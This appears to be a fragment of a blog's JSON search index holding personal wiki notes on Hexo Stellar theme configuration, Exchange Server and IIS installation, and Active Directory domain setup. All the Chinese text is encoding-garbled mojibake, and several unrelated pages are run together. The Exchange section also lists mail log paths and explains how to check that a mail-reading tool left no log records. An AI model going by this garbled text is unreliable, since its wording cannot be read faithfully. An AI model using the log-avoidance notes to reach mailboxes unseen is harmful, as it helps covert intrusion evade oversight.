ï¼ˆä¸€èˆ¬åœ¨wiki\\ä¸‹åˆ›å»ºä¸€æ ·çš„æ–‡ä»¶å¤¹ä¾¿äºåˆ†ç±»ï¼Œå…¶å®åªè¦mdçš„front-matteræŒ‡æ˜äº†wikiå­—æ®µå±äºå“ªä¸ªé¡¹ç›®å³å¯ï¼‰ \\source\\wiki\\stellarStellaræ­å»ºå’Œéƒ¨ç½².md12345---layout: wikiwiki: stellar # è¿™æ˜¯é¡¹ç›®idï¼Œå¯¹åº” /data/wiki/stellar.ymltitle: é…ç½®å’Œæ”¹åŠ¨è®°å½•--- å°†æ­¤é¡¹ç›®ã€Œä¸Šæ¶ã€ blog/source/_data/wiki.ymlæ–‡ä»¶ä¸­å†™å…¥éœ€è¦æ˜¾ç¤ºçš„é¡¹ç›®idï¼š \\source\\_data\\wiki.yml1- stellar è¿™æ ·åœ¨é¡¹ç›®åˆ—è¡¨ï¼ˆwikiï¼‰é¡µé¢å°±å¯ä»¥çœ‹åˆ°åˆšåˆšåˆ›å»ºçš„é¡¹ç›®äº† ä¸“æ  å‚è€ƒé“¾æ¥ğŸ”—ï¼šhttps://xaoxuu.com/wiki/stellar/topic.html åˆ›å»ºä¸€ä¸ªä¸“æ  åœ¨ blog/source/_data/ æ–‡ä»¶å¤¹ä¸­åˆ›å»ºä¸€ä¸ª topic æ–‡ä»¶å¤¹ï¼Œåœ¨å…¶ä¸­æ”¾å…¥å„ä¸ªä¸“æ çš„æè¿°æ–‡ä»¶ï¼Œæ–‡ä»¶åå°±æ˜¯é¡¹ç›®çš„ idï¼š blog/source/_data/topic/id.yml1234name: Stellar # åœ¨é¢åŒ…å±‘å¯¼èˆªä¸Šä¼šæ˜¾ç¤ºè¾ƒçŸ­çš„åå­—title: Stellar - æ¯ä¸ªäººçš„ç‹¬ç«‹åšå®¢ # åœ¨åˆ—è¡¨é¡µä¼šæ˜¾ç¤ºå®Œæ•´çš„ä¸“æ æ ‡é¢˜description: å…³äºæ­å»ºç‹¬ç«‹åšå®¢ç›¸å…³çš„çŸ¥è¯†å’Œç»éªŒåˆ†äº«ï¼Œä»¥åŠ Stellar çš„é«˜çº§ç”¨æ³•ã€ç‰ˆæœ¬æ›´æ–°ç›¸å…³çš„æ³¨æ„äº‹é¡¹ã€‚order_by: -date # é»˜è®¤æ˜¯æŒ‰å‘å¸ƒæ—¥æœŸå€’åºæ’åº å‘å¸ƒæ–‡ç«  åœ¨æ­¤ä¸“æ æ–‡ç« çš„ md æ–‡ä»¶çš„ front-matter éƒ¨åˆ†æŒ‡å®šæ‰€å±çš„ä¸“æ  id ï¼ˆå³ä¸Šä¸€æ­¥åˆ›å»ºçš„æ–‡ä»¶å id.ymlï¼‰ blog/source/_posts/20240114.md123456---title: è¿™æ˜¯æ–‡ç« æ ‡é¢˜topic: id # è¿™æ˜¯ä¸“æ idï¼Œå¯¹åº” blog/source/_data/topic/id.yml---æ–‡ç« æ­£æ–‡ ä¿ºç”¨çš„1.25.0ï¼Œè¿˜éœ€è¦åœ¨mdä¸­åŠ ä¸Šlayout: topicåœ¨ä¸“æ æ–‡ç« ä¾§è¾¹æ æ‰ä¼šæ˜¾ç¤ºå±äºåŒä¸€ä¸“æ ä¸‹çš„æ–‡ç«  å¦‚æœä¸€ç¯‡ä¸“æ æ–‡ç« çš„mdä¸­æ²¡æœ‰æ ‡é¢˜ï¼Œå·¦ä¾§ä¼šå¤šå‡ºæœ€è¿‘æ›´æ–°æ¥è¡¥ç©ºç™½ã€‚ä¸“æ æ–‡ç« å·¦ä¾§ä¸“æ æ–‡ç« é›†åˆå’Œæœ€è¿‘æ›´æ–°æ ·å¼ç›¸è¿‘ï¼Œä¸ºäº†æ¸…æ™°ï¼Œæœ€å¥½åœ¨mdé‡Œè‡³å°‘åŠ ä¸Šä¸€ä¸ªæ ‡é¢˜ mdä¸åšå®¢å›¾ç‰‡çš„å¤„ç† é‡‡ç”¨æœ¬åœ°å›¾ç‰‡ æ–‡ä»¶æ ‘ç»“æ„12345678source:. â”œâ”€wiki â”‚ â””â”€stellar â”‚ 1.md â”‚ â””â”€_post â””â”€blog 1.md è®¾ç½®typoraå›¾åƒå¤åˆ¶çš„è·¯å¾„ä¸º typoraå›¾åƒå¤åˆ¶è·¯å¾„1../../Typora_images/$&#123;filename&#125; mdæ–‡ç« çš„front-matter xx.md123---typora-root-url: ../--- troubleshooting:ç½‘é¡µå›¾ç‰‡æœªæ˜¾ç¤º å¤ç°æƒ…å†µå¥½åƒéƒ½æ˜¯ï¼šç”µè„‘æ”¾ç€ç³»ç»Ÿè‡ªåŠ¨æ›´æ–°é‡å¯åç¬¬ä¸€æ¬¡æ‰§è¡Œhexo clean &amp;&amp; hexo s -p 5000ç½‘é¡µå°±ä¸æ˜¾ç¤ºå‡ºå›¾ç‰‡ã€‚ è§£å†³åŠæ³•ï¼šå…³æ‰ï¼Œé‡æ–°æ‰§è¡Œå‡ æ¬¡ã€‚æˆ–å…³ç”µè„‘ğŸ’»ï¼Œè¿‡æ®µæ—¶é—´å¼€ éæºç æ”¹åŠ¨ æ¸²æŸ“æ•°å­¦å…¬å¼ å‚è€ƒï¼šhttps://blog.csdn.net/subtitle_/article/details/130004464 å®‰è£…å’Œå¸è½½ç›¸å…³çš„npmåŒ… 1npm uninstall hexo-renderer-marked --save 1npm install hexo-renderer-markdown-it-plus --save å…¨å±€å¯ç”¨ _config.stellar.yml12345678910# Katex - The fastest math typesetting library for the web# https://katex.org/docs/autorender.html# https://github.com/KaTeX/KaTeX# ä½¿ç”¨ hexo-renderer-markdown-it-plus ä½œä¸ºå…¬å¼æ¸²æŸ“å™¨ï¼šnpm uninstall hexo-renderer-marked --save npm install hexo-renderer-markdown-it-plus --savekatex: # set &lt;katex: true&gt; to enable in page&#x27;s front-matter enable: true min_css: &lt;link rel=&quot;stylesheet&quot; href=&quot;https://gcore.jsdelivr.net/npm/katex@0.16.4/dist/katex.min.css&quot; integrity=&quot;sha384-vKruj+a13U8yHIkAyGgK1J3ArTLzrFGBbBc0tDp4ad/EyewESeXE/Iv67Aj8gKZ0&quot; crossorigin=&quot;anonymous&quot;&gt; min_js: &lt;script defer src=&quot;https://gcore.jsdelivr.net/npm/katex@0.16.4/dist/katex.min.js&quot; integrity=&quot;sha384-PwRUT/YqbnEjkZO0zZxNqcxACrXe+j766U2amXcgMg5457rve2Y7I6ZJSm2A0mS4&quot; crossorigin=&quot;anonymous&quot;&gt;&lt;/script&gt; auto_render_min_js: &lt;script defer src=&quot;https://gcore.jsdelivr.net/npm/katex@0.16.4/dist/contrib/auto-render.min.js&quot; integrity=&quot;sha384-+VBxd3r6XgURycqtZ117nYw44OOcIax56Z4dCRWbxyPt0Koah1uHoK0o4+/RRE05&quot; crossorigin=&quot;anonymous&quot;onload=&quot;renderMathInElement(document.body);&quot;&gt;&lt;/script&gt; æŒ‡å®špageå¯ç”¨ï¼ˆ1.25.0ä¿ºæ˜¯è¿™ç§æ–¹å¼ï¼‰ åœ¨mdçš„front-matterç”¨katex: trueæ¥å¯ç”¨ 1.26.2ç‰ˆæœ¬ä»¥åkatexã€mathjaxã€mermaidæ”¯æŒåœ¨é…ç½®æ–‡ä»¶ä¸­è®¾ç½®å…¨å±€å¼€å¯ å¤æ‚çš„ Markdown è¡¨æ ¼ï¼ˆè¯•äº†ï¼Œæ²¡æ¸²æŸ“å‡ºæ¥ï¼‰ ~~å‚è€ƒï¼šhttps://www.panoshu.top/blog/2c3f9e38/#fu-za-de-markdown-biao-ge~~ 1npm i markdown-it-multimd-table --save åœ¨ç«™ç‚¹é…ç½®æ–‡ä»¶_config.ymlä¸­å¢åŠ markdown-itçš„æ’ä»¶é…ç½® _config.yml12345678plugins: - plugin: name: markdown-it-multimd-table enable: true options: multiline: false rowspan: true headerless: false æœ€åè§£å†³åŠæ³•ï¼šç”¨HTMLè¯­è¨€ æ–‡ç« æ°¸ä¹…é“¾æ¥ å‚è€ƒï¼šhttps://www.heson10.com/posts/31426.htmlï¼ˆå·²åœç«™ï¼‰ Hexoåšå®¢æŒ‡å—|ç¬¬å››ç¯‡:æ°¸ä¹…é“¾æ¥ä¹‹abbrlink hexo-abbrlink-githubä»“åº“ è¿™é‡ŒæŒ‡çš„æ˜¯postæ–‡ç« çš„é“¾æ¥ï¼Œwikiçš„æ²¡æ³•å¼„æˆæ°¸ä¹…é“¾æ¥ å®‰è£…npmåŒ… 1npm install hexo-abbrlink --save ä¿®æ”¹_config.ymlå…³äºpermalinkçš„é…ç½® _config.yml123456789# permalink: :year/:month/:day/:title/permalink: posts/:abbrlink.html # æ­¤å¤„å¯ä»¥è‡ªå·±è®¾ç½®ï¼Œä¹Ÿå¯ä»¥ç›´æ¥ä½¿ç”¨ :/abbrlinkabbrlink: alg: crc32 #ç®—æ³•ï¼š crc16(default) and crc32 rep: hex #è¿›åˆ¶ï¼š dec(default) and hexpermalink_defaults:pretty_urls: trailing_index: true # Set to false to remove trailing &#x27;index.html&#x27; from permalinks trailing_html: true # Set to false to remove trailing &#x27;.html&#x27; from permalinks å…³é—­ç½‘é¡µä¸­å›¾ç‰‡ä¸‹æ–¹çš„å›¾ç‰‡æ–‡ä»¶å 1.22.1ä¸å†æ”¯æŒ parse_markdown: true æ¥å°† ![]() æ›¿æ¢æˆ &#123;% image xxx %&#125; å› ä¸ºstellarè‡ªåŠ¨å°†mdä¸­çš„å›¾ç‰‡è½¬æˆå›¾ç‰‡æ ‡ç­¾ï¼Œæ‰€ä»¥ä¼šå¸¦å›¾ç‰‡æè¿°åï¼Œå…³æ‰è¿™ä¸ªè½¬æ¢ _config.stellar.yml1234# &#123;% image %&#125;image: fancybox: false # true, false parse_markdown: false # æŠŠ markdown æ ¼å¼çš„å›¾ç‰‡è§£ææˆå›¾ç‰‡æ ‡ç­¾ æ–¹æ³•äºŒï¼šmdé‡Œå›¾ç‰‡çš„[]å°±æ˜¯æè¿°ï¼Œä¸å†™å°±è¡Œ æºç æ”¹åŠ¨ æ­£æ–‡æ˜¾ç¤ºå®½åº¦ 720pxæ”¹æˆ900px node_modules/hexo-theme-stellar/source/css/_custom.styl1234:root --width-left: 288px // Adjust this to increase/decrease the sidebar width // --width-main: 720px --width-main: 900px // Adjust this to increase/decrease the main content width"},{"title":"Exchangeé‚®ç®±æœåŠ¡å™¨","path":"/wiki/windows_env/Exchangeé‚®ç®±æœåŠ¡å™¨.html","content":"isoä¸‹è½½ å‚è€ƒé“¾æ¥ğŸ”— å¤‡æ³¨ www.msexchangeupdates.com å¤šä¸ªExchange Serverç‰ˆæœ¬çš„ä¸‹è½½é“¾æ¥ Exchange 2019 cu7å’Œcu8éƒ½è·³è½¬åˆ°äº†Microsoft Volume Licensing Centeré¡µé¢ï¼Œæ²¡è¯•è¿‡æ³¨å†Œ ç¯å¢ƒæ­å»º Exchange 2016Exchange 2019 å‚è€ƒé“¾æ¥ğŸ”—ï¼š https://saucer-man.com/information_security/748.html#cl-3 Exchange CVE-2021-34473 - Colin.B - åšå®¢å›­ (cnblogs.com) å®˜æ–¹æ–‡æ¡£é“¾æ¥æ˜¯https://docs.microsoft.com/zh-cn/exchange/plan-and-deploy/prerequisites?view=exchserver-2016 å®‰è£…çš„server2016æœºå™¨éœ€è¦æ˜¯åŸŸæˆå‘˜ï¼Œç”¨æˆ·è¦ä¹ˆæ˜¯åŸŸç®¡ï¼Œè¦ä¹ˆæ˜¯åŸŸç†ç»„ç”¨æˆ·ï¼ˆè¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆå†…ç½‘æ¸—é€æ—¶å¦‚æœæ‹¿Exchangeï¼Œå’Œæ‹¿äº†åŸŸç®¡å·®ä¸å¤šï¼‰ï¼Œè£…é‚®ç®±æœåŠ¡å™¨å†…å­˜è‡³å°‘8GB å·æ‡’çš„è¯å°†server2016æå‡ä¸ºDCï¼ŒåŸŸç®¡è´¦æˆ·ç™»å½•ï¼Œç„¶åå¼€å§‹è£…Exchange2016 è§£å‹Exchange server.isoæ‰§è¡Œsetup.exeå‰è¦è£…ä¸€äº›ä¾èµ–ç»„ä»¶ NET Framework 4.8 å®‰è£…Visual C++ Redistributable Package for Visual Studio 2012 Visual C++ 2013 Redistributable Package é€šè¿‡Power Shellå®‰è£…Exchangeå¿…å¤‡çš„Windowsç»„ä»¶ 1Install-WindowsFeature Server-Media-Foundation, NET-Framework-45-Features, RPC-over-HTTP-proxy, RSAT-Clustering, RSAT-Clustering-CmdInterface, RSAT-Clustering-Mgmt, RSAT-Clustering-PowerShell, WAS-Process-Model, Web-Asp-Net45, Web-Basic-Auth, Web-Client-Auth, Web-Digest-Auth, Web-Dir-Browsing, Web-Dyn-Compression, Web-Http-Errors, Web-Http-Logging, Web-Http-Redirect, Web-Http-Tracing, Web-ISAPI-Ext, Web-ISAPI-Filter, Web-Lgcy-Mgmt-Console, Web-Metabase, Web-Mgmt-Console, Web-Mgmt-Service, Web-Net-Ext45, Web-Request-Monitor, Web-Server, Web-Stat-Compression, Web-Static-Content, Web-Windows-Auth, Web-WMI, Windows-Identity-Foundation, RSAT-ADDS è§£å‹exchange 2016 iosåŒå‡»setupç¨‹åº è§£å†³å‡ºç°çš„é”™è¯¯ï¼Œæ ¹æ®é“¾æ¥è£…ç›¸åº”çš„ç¨‹åº serve2016rå¯èƒ½éœ€è¦æ‰“ä¸€ä¸ªè¡¥ä¸ï¼Œæ ¹æ®é“¾æ¥ä¸‹è½½è¿™ä¸ªè¡¥ä¸ è¦è£…ä¸ªUnified Communications Managed API 4.0 Runtime å‚è€ƒé“¾æ¥ğŸ”—ï¼šhttps://learn.microsoft.com/zh-cn/exchange/plan-and-deploy/prerequisites?view=exchserver-2019&amp;source=recommendations æ­¥éª¤å’Œ2016çš„ä¸€æ ·ï¼Œæ£€æŸ¥ï¼Œå¯èƒ½çš„æŠ¥é”™ï¼š éœ€è¦é‡å¯ï¼Œé‚£å°±é‡å¯The computer needs to be restarted before Setup can continue [RebootPending] è¦è£…ä¸ªUnified Communications Managed API 4.0 Runtime warningå¯ä»¥å¿½ç•¥ï¼Œç‚¹å‡»Installå¼€å§‹å®‰è£… ç™»å½•ç½‘å€ ç”¨æˆ·ç™»å½•é‚®ç®±çš„ç½‘å€ï¼šOutlook Web App (OWA): https://&lt;ä½ çš„åŸŸå&gt;/owa ç®¡ç†å‘˜åå°ç½‘å€ï¼šExchange ç®¡ç†ä¸­å¿ƒ (EAC): https://&lt;ä½ çš„åŸŸå&gt;/ecp å…¶ä»–ç›¸å…³çš„å¯ä»¥ç™»å½•åå°çš„ç½‘å€å¯èƒ½åŒ…æ‹¬ï¼š Exchange ç®¡ç†æ§åˆ¶å° (EMC)ï¼šè¿™æ˜¯Exchange 2010çš„ç®¡ç†å·¥å…·ï¼ŒExchange 2016é€šå¸¸ä½¿ç”¨EACã€‚ Exchange ç®¡ç† Shellï¼šè¿™æ˜¯ä¸€ä¸ªåŸºäºPowerShellçš„å‘½ä»¤è¡Œç•Œé¢ï¼Œç”¨äºç®¡ç†Exchange Serverã€‚ å…³äºé‚®ä»¶å­˜å‚¨çš„é—®é¢˜ï¼Œå½“ç”¨æˆ·1ä»é‚®ç®±ç•Œé¢å‘é€é‚®ä»¶ç»™ç”¨æˆ·2æ—¶ï¼Œé‚®ä»¶ä¼šç»è¿‡Exchangeçš„ä¼ è¾“æœåŠ¡ï¼Œå¹¶æœ€ç»ˆå­˜å‚¨åœ¨æ•°æ®åº“ä¸­ã€‚Exchange Serverä½¿ç”¨ä¸€ä¸ªå«åšExchange æ•°æ®åº“ (EDB) çš„æ–‡ä»¶æ¥å­˜å‚¨æ‰€æœ‰çš„é‚®ç®±æ•°æ®ï¼ŒåŒ…æ‹¬é‚®ä»¶ã€æ—¥å†æ¡ç›®ã€ä»»åŠ¡å’Œå…¶ä»–é‚®ç®±å¯¹è±¡ã€‚ æ—¥å¿— åœ¨Exchange Serverä¸­ï¼Œé‚®ä»¶è®¿é—®å’Œä¼ è¾“çš„æ—¥å¿—ä¿¡æ¯é€šå¸¸å¯ä»¥åœ¨ä»¥ä¸‹ä½ç½®æ‰¾åˆ°ï¼š æ¶ˆæ¯è·Ÿè¸ªæ—¥å¿— - è¿™äº›æ—¥å¿—è®°å½•äº†é‚®ä»¶é€šè¿‡Exchangeä¼ è¾“ç®¡é“çš„ä¿¡æ¯ï¼Œå¯ä»¥ç”¨æ¥è·Ÿè¸ªé‚®ä»¶çš„æµåŠ¨ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œè¿™äº›æ—¥å¿—ä½äºä»¥ä¸‹è·¯å¾„ï¼š 1C:\\Program Files\\Microsoft\\Exchange Server\\V15\\TransportRoles\\Logs\\MessageTracking IISæ—¥å¿— - å¯¹äºé€šè¿‡OWAæˆ–EASï¼ˆExchange ActiveSyncï¼‰è®¿é—®çš„é‚®ä»¶ï¼Œç›¸å…³çš„HTTPè¯·æ±‚ä¼šè¢«è®°å½•åœ¨IISæ—¥å¿—ä¸­ã€‚è¿™äº›æ—¥å¿—é€šå¸¸ä½äºä»¥ä¸‹è·¯å¾„ï¼š 1C:\\inetpub\\logs\\LogFiles RPC å®¢æˆ·ç«¯è®¿é—®æ—¥å¿— - å¯¹äºé€šè¿‡MAPI/HTTPæˆ–RPC/HTTPè®¿é—®çš„é‚®ä»¶ï¼Œç›¸å…³çš„æ—¥å¿—ä¼šè¢«è®°å½•åœ¨RPC å®¢æˆ·ç«¯è®¿é—®æ—¥å¿—ä¸­ã€‚è¿™äº›æ—¥å¿—é€šå¸¸ä½äºä»¥ä¸‹è·¯å¾„ï¼š 1C:\\Program Files\\Microsoft\\Exchange Server\\V15\\Logging\\RPC Client Access å®¡è®¡æ—¥å¿— - å¦‚æœå¯ç”¨äº†é‚®ç®±å®¡è®¡æ—¥å¿—ï¼Œé‚£ä¹ˆå¯¹é‚®ç®±çš„æ“ä½œï¼ˆå¦‚ç™»å½•ã€è¯»å–é‚®ä»¶ç­‰ï¼‰ä¼šè¢«è®°å½•ä¸‹æ¥ã€‚è¿™äº›æ—¥å¿—å¯ä»¥é€šè¿‡Exchange ç®¡ç†ä¸­å¿ƒï¼ˆEACï¼‰æˆ–Exchange ç®¡ç† Shellè®¿é—®ã€‚ å¦‚æœæƒ³è¯æ˜å·¥å…·åœ¨ä¸äº§ç”Ÿæ—¥å¿—çš„æƒ…å†µä¸‹è·å–åˆ°äº†é‚®ä»¶ï¼Œéœ€è¦æ£€æŸ¥ä¸Šè¿°æ—¥å¿—æ–‡ä»¶ï¼Œç¡®è®¤åœ¨è¿è¡Œå·¥å…·çš„æ—¶é—´æ®µå†…æ²¡æœ‰ç›¸å…³çš„æ—¥å¿—è®°å½•è¢«ç”Ÿæˆã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¦‚æœå·¥å…·æ˜¯ç›´æ¥è¯»å–EDBæ–‡ä»¶ï¼Œè€Œä¸æ˜¯é€šè¿‡Exchangeçš„æ­£å¸¸é‚®ä»¶è®¿é—®æµç¨‹ï¼Œé‚£ä¹ˆå¯èƒ½ä¸ä¼šåœ¨æ¶ˆæ¯è·Ÿè¸ªæ—¥å¿—æˆ–IISæ—¥å¿—ä¸­ç•™ä¸‹è®°å½•ã€‚ä½†æ˜¯ï¼Œå¦‚æœå·¥å…·ä»¥æŸç§æ–¹å¼æ¨¡æ‹Ÿäº†ç”¨æˆ·è®¿é—®ï¼Œé‚£ä¹ˆå¯èƒ½ä¼šåœ¨RPCå®¢æˆ·ç«¯è®¿é—®æ—¥å¿—æˆ–å®¡è®¡æ—¥å¿—ä¸­çœ‹åˆ°ç›¸å…³è®°å½•ã€‚"},{"title":"IIS","path":"/wiki/windows_env/IIS.html","content":"å®‰è£…IIS ä¸éœ€è¦serverç‰ˆ æ§åˆ¶é¢æ¿-ç¨‹åºå’ŒåŠŸèƒ½-å¯ç”¨æˆ–å…³é—­WindowsåŠŸèƒ½ ä¸åŒç³»ç»Ÿç‰ˆæœ¬å‹¾é€‰çš„ä¸ä¸€æ ·ï¼Œä¸éœ€è¦è¿ç½‘ï¼Œå®‰è£…å®ŒæˆåæŒ‰ç…§æç¤ºé‡å¯ å®‰è£…å¥½åå¯ä»¥æœåˆ°IIS ç„¶åå¯ä»¥ç”¨æµè§ˆå™¨è®¿é—®è£…äº†IISçš„è¿™å°ç”µè„‘ip:80 æ—¥å¿— æ—¥å¿—çš„æ˜¾ç¤ºå¯èƒ½æœ‰å»¶è¿Ÿ What is IIS chatGPT4 å¾…å†æ¬¡ç»„ç»‡æ•´ç† Qï¼šä»€ä¹ˆæ˜¯IISï¼ŒIISçš„åº”ç”¨åœºæ™¯æ˜¯ä»€ä¹ˆï¼Œåœ¨è¯¥åœºæ™¯ä¸­æ•°æ®çš„äº¤äº’è¿‡ç¨‹æ˜¯æ€æ ·çš„ã€‚ä¸ºä»€ä¹ˆä¼šè¯ç”ŸIISï¼ŒIISè§£å†³äº†å“ªäº›é—®é¢˜ Aï¼š IISï¼ˆInternet Information Servicesï¼Œäº’è”ç½‘ä¿¡æ¯æœåŠ¡ï¼‰æ˜¯ä¸€ä¸ªç”¨äºWindowsæœåŠ¡å™¨æ“ä½œç³»ç»Ÿçš„WebæœåŠ¡å™¨å’Œåº”ç”¨ç¨‹åºæœåŠ¡å™¨ã€‚å®ƒæœ€åˆæ˜¯ä¸ºäº†æ‰©å±•Windows NT 3.51çš„ç½‘ç»œåŠŸèƒ½è€Œè®¾è®¡çš„ã€‚IISæä¾›äº†ä¸€ç§åˆ›å»ºã€é…ç½®å’Œç®¡ç†Webç«™ç‚¹ã€åº”ç”¨ç¨‹åºå’ŒæœåŠ¡çš„æ–¹å¼ï¼Œå®ƒæ”¯æŒHTTPã€HTTPSã€FTPã€FTPSã€SMTPç­‰åè®®ã€‚ IISçš„åº”ç”¨åœºæ™¯ä¸»è¦åŒ…æ‹¬ï¼š æ‰˜ç®¡Webç«™ç‚¹ï¼šå¯ä»¥ä¸ºä¼ä¸šæˆ–ä¸ªäººåˆ›å»ºã€å‘å¸ƒå’Œç»´æŠ¤Webç«™ç‚¹ï¼Œæä¾›ä¿¡æ¯ã€æœåŠ¡æˆ–äº§å“ã€‚ æä¾›Webåº”ç”¨ç¨‹åºæ”¯æŒï¼šé€šè¿‡IISï¼Œå¼€å‘è€…å¯ä»¥æ„å»ºåŸºäºASP.NETã€PHPç­‰ç¼–ç¨‹è¯­è¨€çš„Webåº”ç”¨ç¨‹åºï¼Œå¹¶è¿è¡Œåœ¨æœåŠ¡å™¨ä¸Šã€‚ åˆ›å»ºå’Œç®¡ç†WebæœåŠ¡ï¼šIISæ”¯æŒåŸºäºSOAPã€RESTfulç­‰åè®®çš„WebæœåŠ¡ï¼Œç”¨äºåœ¨ä¸åŒå¹³å°å’Œè®¾å¤‡ä¹‹é—´äº¤æ¢æ•°æ®ã€‚ åœ¨IISçš„åº”ç”¨åœºæ™¯ä¸­ï¼Œæ•°æ®äº¤äº’çš„è¿‡ç¨‹å¤§è‡´å¦‚ä¸‹ï¼š å®¢æˆ·ç«¯ï¼ˆé€šå¸¸æ˜¯Webæµè§ˆå™¨ï¼‰å‘æœåŠ¡å™¨å‘é€è¯·æ±‚ã€‚ æœåŠ¡å™¨æ¥æ”¶åˆ°è¯·æ±‚åï¼Œæ ¹æ®è¯·æ±‚çš„URLï¼Œé€šè¿‡IISè¿›è¡Œè·¯ç”±å’Œå¤„ç†ã€‚ å¦‚æœè¯·æ±‚éœ€è¦è¿è¡ŒæœåŠ¡å™¨ç«¯ä»£ç ï¼ˆä¾‹å¦‚ASP.NETæˆ–PHPï¼‰ï¼ŒIISä¼šå°†è¯·æ±‚ä¼ é€’ç»™ç›¸åº”çš„å¤„ç†ç¨‹åºï¼ˆå¦‚.NETè¿è¡Œæ—¶æˆ–PHPè§£é‡Šå™¨ï¼‰ã€‚ æœåŠ¡å™¨ç«¯ä»£ç æ‰§è¡Œå®Œæˆåï¼ŒIISå°†å¤„ç†ç»“æœï¼ˆé€šå¸¸æ˜¯HTMLã€CSSã€JavaScriptç­‰é™æ€æ–‡ä»¶ï¼‰è¿”å›ç»™å®¢æˆ·ç«¯ã€‚ å®¢æˆ·ç«¯æµè§ˆå™¨è§£æå’Œæ¸²æŸ“æ”¶åˆ°çš„å†…å®¹ï¼Œæ˜¾ç¤ºç»™ç”¨æˆ·ã€‚ IISçš„è¯ç”Ÿå’Œå‘å±•è§£å†³äº†ä»¥ä¸‹é—®é¢˜ï¼š æä¾›äº†ä¸€ä¸ªé›†æˆçš„ã€æ˜“äºç®¡ç†çš„WebæœåŠ¡å™¨å’Œåº”ç”¨ç¨‹åºæœåŠ¡å™¨å¹³å°ï¼Œä½¿å¾—åœ¨WindowsæœåŠ¡å™¨ä¸Šéƒ¨ç½²Webåº”ç”¨å˜å¾—æ›´åŠ ç®€å•ã€‚ æé«˜äº†æ€§èƒ½å’Œç¨³å®šæ€§ï¼šIISä¸æ–­ä¼˜åŒ–ï¼Œä»¥æé«˜å¯¹å¤§é‡å¹¶å‘è¯·æ±‚çš„å¤„ç†èƒ½åŠ›å’Œå¯¹ç³»ç»Ÿèµ„æºçš„æœ‰æ•ˆåˆ©ç”¨ã€‚ æä¾›äº†å®‰å…¨æ€§ï¼šIISåŒ…å«äº†å¤šç§å®‰å…¨æªæ–½ï¼Œå¦‚SSL/TLSæ”¯æŒã€èº«ä»½éªŒè¯å’Œè®¿é—®æ§åˆ¶ï¼Œä»¥ä¿æŠ¤æœåŠ¡å™¨å’Œåº”ç”¨ç¨‹åºã€‚ æ”¯æŒå¤šç§ç¼–ç¨‹è¯­è¨€å’Œå¹³å°ï¼šIISå…è®¸å¼€å‘è€…ä½¿ç”¨ASP.NETã€PHPç­‰ç¼–ç¨‹è¯­è¨€å¼€å‘Webåº”ç”¨ï¼Œæé«˜äº†å¼€å‘çµæ´»æ€§ã€‚ æ€»ä¹‹ï¼ŒIISæ˜¯ä¸€ä¸ªåŠŸèƒ½ä¸°å¯Œã€æ€§èƒ½ç¨³å®šçš„WebæœåŠ¡å™¨å’Œåº”ç”¨ç¨‹åºæœåŠ¡å™¨ï¼Œå®ƒåœ¨Webç«™ç‚¹æ‰˜ç®¡ã€Webåº”ç”¨ç¨‹åºå’ŒWebæœåŠ¡æ–¹é¢æœ‰å¹¿æ³›çš„åº”ç”¨ã€‚"},{"title":"åŸŸç¯å¢ƒ","path":"/wiki/windows_env/åŸŸç¯å¢ƒ.html","content":"å®‰è£…åŸŸ å‡†å¤‡ä¸€å°windows serverï¼Œå®‰è£…å‰è¦ï¼š Administratorå¼ºå¯†ç  å°†å½“å‰æœºå™¨è®¾ç½®ä¸ºé™æ€IPï¼ŒDNSé¦–é€‰æœåŠ¡å™¨è®¾ç½®ä¸º127.0.0.1 powershellæ–¹å¼å®‰è£…æ‰‹åŠ¨æ–¹å¼å®‰è£… å‚è€ƒé“¾æ¥ğŸ”— å¤‡æ³¨ğŸ“• æœ€å¿«çš„æ–¹å¼æ­å»ºåŸŸç¯å¢ƒ Install Active Directory Domain Services (Level 100) githubç‰ˆï¼Œå¾®è½¯å®˜æ–¹æ‰‹å†Œï¼Œå¦‚ä½•ç”¨pwæ–¹å¼å®‰è£… Install Active Directory Domain Services (Level 100) msdnç‰ˆï¼Œå¾®è½¯å®˜æ–¹æ‰‹å†Œï¼Œå¦‚ä½•ç”¨pwæ–¹å¼å®‰è£… ç®¡ç†å‘˜æƒé™powershell å®‰è£…æ´»åŠ¨ç›®å½•åŸŸæœåŠ¡è§’è‰²Active Directory Domain Services (AD DS) 1Install-WindowsFeature -name AD-Domain-Services -IncludeManagementTools IncludeManagementToolså‚æ•°ï¼šæ˜¯åœ¨å®‰è£…AD DSè§’è‰²æ—¶ï¼Œç”¨æ¥æŒ‡å®šåŒæ—¶å®‰è£…ç®¡ç†å·¥å…·çš„ã€‚è¿™ä¸ªå‚æ•°ä¼šå®‰è£…åŒ…æ‹¬Active Directoryç”¨æˆ·å’Œè®¡ç®—æœºã€ç»„ç­–ç•¥ç®¡ç†ç¼–è¾‘å™¨ç­‰åœ¨å†…çš„å›¾å½¢ç•Œé¢ç®¡ç†å·¥å…·å’Œå‘½ä»¤è¡Œå·¥å…· å¯¼å…¥AD DSéƒ¨ç½²æ¨¡å— 1Import-Module ADDSDeployment åœ¨æ‰§è¡Œå®‰è£…æˆ–é…ç½®Active Directoryä¹‹å‰ï¼Œéœ€è¦å¯¼å…¥AD DSéƒ¨ç½²æ¨¡å—ã€‚ è°ƒç”¨Install-ADDSForestè®¾ç½®åŸŸçš„ä¿¡æ¯æ‰§è¡Œå®‰è£… 123456789101112Install-ADDSForest `-CreateDnsDelegation:$false `-DomainMode &quot;WinThreshold&quot; `-DomainName &quot;mytest.local&quot; `-DomainNetbiosName &quot;MYTEST&quot; `-ForestMode &quot;WinThreshold&quot; `-DatabasePath &quot;C:\\Windows\\NTDS&quot; `-LogPath &quot;C:\\Windows\\NTDS&quot; `-SysvolPath &quot;C:\\Windows\\SYSVOL&quot; `-InstallDns:$true `-NoRebootOnCompletion:$false `-Force:$true CreateDnsDelegationï¼šæ˜¯å¦åˆ›å»ºå¼•ç”¨ä¸åŸŸæ§åˆ¶å™¨ä¸€èµ·å®‰è£…çš„æ–°DNSæœåŠ¡å™¨çš„DNSå§”æ´¾ã€‚ ä»…å¯¹ Active Directoryâ€œé›†æˆ DNS æœ‰æ•ˆã€‚é»˜è®¤å€¼æ˜¯æ ¹æ®ç¯å¢ƒè‡ªåŠ¨è®¡ç®—çš„ã€‚ 